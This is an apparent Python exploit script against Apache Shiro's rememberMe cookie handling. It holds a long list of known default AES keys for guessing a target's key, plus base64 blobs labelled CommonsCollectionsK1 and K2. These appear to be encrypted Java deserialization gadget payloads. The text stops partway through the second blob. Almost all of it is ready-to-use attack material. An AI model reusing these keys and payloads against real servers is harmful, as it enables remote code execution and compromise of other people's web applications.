# -*- coding:utf-8 -*-
import sys
import base64
import uuid
import requests
import subprocess
import logging
from random import Random
import re
from time import sleep
from Crypto.Cipher import AES
from colorama import Fore, Back, Style, init

# ERROR: ('Connection broken: IncompleteRead(0 bytes read)', IncompleteRead(0 bytes read))
import http.client

http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'

init(autoreset=True)
logging.basicConfig(
    # 日志文件保存，不指定日志信息默认输出到控制台
    filename='log.log',
    level=logging.INFO,
    # 时间、代码所在文件名、代码行号、日志级别名字、日志信息
    format='\n[logging] [%(asctime)s] {%(pathname)s:%(lineno)d} %(levelname)s: %(message)s',
    datefmt='%H:%M:%S'
)

# logging.error("Some ss")
# logging.warning("waring")
# print(logging.getLoggerClass().root.handlers[0].baseFilename)

keys = [
    "kPH+bIxk5D2deZiIxcaaaA==",
    "kPv59vyqzj00x11LXJZTjJ2UHW48jzHN",
    "4AvVhmFLUs0KTA3Kprsdag==",
    "Z3VucwAAAAAAAAAAAAAAAA==",
    "fCq+/xW488hMTCD+cmJ3aQ==",
    "0AvVhmFLUs0KTA3Kprsdag==",
    "1AvVhdsgUs0FSA3SDFAdag==",
    "1QWLxg+NYmxraMoxAXu/Iw==",
    "25BsmdYwjnfcWmnhAciDDg==",
    "2AvVhdsgUs0FSA3SDFAdag==",
    "3AvVhmFLUs0KTA3Kprsdag==",
    "3JvYhmBLUs0ETA5Kprsdag==",
    "r0e3c16IdVkouZgk1TKVMg==",
    "5aaC5qKm5oqA5pyvAAAAAA==",
    "5AvVhmFLUs0KTA3Kprsdag==",
    "6AvVhmFLUs0KTA3Kprsdag==",
    "6NfXkC7YVCV5DASIrEm1Rg==",
    "6ZmI6I2j5Y+R5aSn5ZOlAA==",
    "cmVtZW1iZXJNZQAAAAAAAA==",
    "7AvVhmFLUs0KTA3Kprsdag==",
    "8AvVhmFLUs0KTA3Kprsdag==",
    "8BvVhmFLUs0KTA3Kprsdag==",
    "9AvVhmFLUs0KTA3Kprsdag==",
    "OUHYQzxQ/W9e/UjiAGu6rg==",
    "a3dvbmcAAAAAAAAAAAAAAA==",
    "aU1pcmFjbGVpTWlyYWNsZQ==",
    "bWljcm9zAAAAAAAAAAAAAA==",
    "bWluZS1hc3NldC1rZXk6QQ==",
    "bXRvbnMAAAAAAAAAAAAAAA==",
    "ZUdsaGJuSmxibVI2ZHc9PQ==",
    "wGiHplamyXlVB11UXWol8g==",
    "U3ByaW5nQmxhZGUAAAAAAA==",
    "MTIzNDU2Nzg5MGFiY2RlZg==",
    "L7RioUULEFhRyxM7a2R/Yg==",
    "a2VlcE9uR29pbmdBbmRGaQ==",
    "WcfHGU25gNnTxTlmJMeSpw==",
    "OY//C4rhfwNxCQAQCrQQ1Q==",
    "5J7bIJIV0LQSN3c9LPitBQ==",
    "f/SY5TIve5WWzT4aQlABJA==",
    "bya2HkYo57u6fWh5theAWw==",
    "WuB+y2gcHRnY2Lg9+Aqmqg==",
    "kPv59vyqzj00x11LXJZTjJ2UHW48jzHN",
    "3qDVdLawoIr1xFd6ietnwg==",
    "YI1+nBV//m7ELrIyDHm6DQ==",
    "6Zm+6I2j5Y+R5aS+5ZOlAA==",
    "2A2V+RFLUs+eTA3Kpr+dag==",
    "6ZmI6I2j3Y+R1aSn5BOlAA==",
    "SkZpbmFsQmxhZGUAAAAAAA==",
    "2cVtiE83c4lIrELJwKGJUw==",
    "fsHspZw/92PrS3XrPW+vxw==",
    "XTx6CKLo/SdSgub+OPHSrw==",
    "sHdIjUN6tzhl8xZMG3ULCQ==",
    "O4pdf+7e+mZe8NyxMTPJmQ==",
    "HWrBltGvEZc14h9VpMvZWw==",
    "rPNqM6uKFCyaL10AK51UkQ==",
    "Y1JxNSPXVwMkyvES/kJGeQ==",
    "lT2UvDUmQwewm6mMoiw4Ig==",
    "MPdCMZ9urzEA50JDlDYYDg==",
    "xVmmoltfpb8tTceuT5R7Bw==",
    "c+3hFGPjbgzGdrC+MHgoRQ==",
    "ClLk69oNcA3m+s0jIMIkpg==",
    "Bf7MfkNR0axGGptozrebag==",
    "1tC/xrDYs8ey+sa3emtiYw==",
    "ZmFsYWRvLnh5ei5zaGlybw==",
    "cGhyYWNrY3RmREUhfiMkZA==",
    "IduElDUpDDXE677ZkhhKnQ==",
    "yeAAo1E8BOeAYfBlm4NG9Q==",
    "cGljYXMAAAAAAAAAAAAAAA==",
    "2itfW92XazYRi5ltW0M2yA==",
    "XgGkgqGqYrix9lI6vxcrRw==",
    "ertVhmFLUs0KTA3Kprsdag==",
    "5AvVhmFLUS0ATA4Kprsdag==",
    "s0KTA3mFLUprK4AvVhsdag==",
    "hBlzKg78ajaZuTE0VLzDDg==",
    "9FvVhtFLUs0KnA3Kprsdyg==",
    "d2ViUmVtZW1iZXJNZUtleQ==",
    "yNeUgSzL/CfiWw1GALg6Ag==",
    "NGk/3cQ6F5/UNPRh8LpMIg==",
    "4BvVhmFLUs0KTA3Kprsdag==",
    "MzVeSkYyWTI2OFVLZjRzZg==",
    "empodDEyMwAAAAAAAAAAAA==",
    "A7UzJgh1+EWj5oBFi+mSgw==",
    "c2hpcm9fYmF0aXMzMgAAAA==",
    "i45FVt72K2kLgvFrJtoZRw==",
    "U3BAbW5nQmxhZGUAAAAAAA==",
    "ZnJlc2h6Y24xMjM0NTY3OA==",
    "Jt3C93kMR9D5e8QzwfsiMw==",
    "MTIzNDU2NzgxMjM0NTY3OA==",
    "vXP33AonIp9bFwGl7aT7rA==",
    "V2hhdCBUaGUgSGVsbAAAAA==",
    "Q01TX0JGTFlLRVlfMjAxOQ==",
    "ZAvph3dsQs0FSL3SDFAdag==",
    "Is9zJ3pzNh2cgTHB4ua3+Q==",
    "NsZXjXVklWPZwOfkvk6kUA==",
    "GAevYnznvgNCURavBhCr1w==",
    "66v1O8keKNV3TTcGPK1wzg==",
    "SDKOLKn2J1j/2BHjeZwAoQ==",
]
remember = {
    "CommonsCollectionsK1": "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"
    ,
    "CommonsCollectionsK2": "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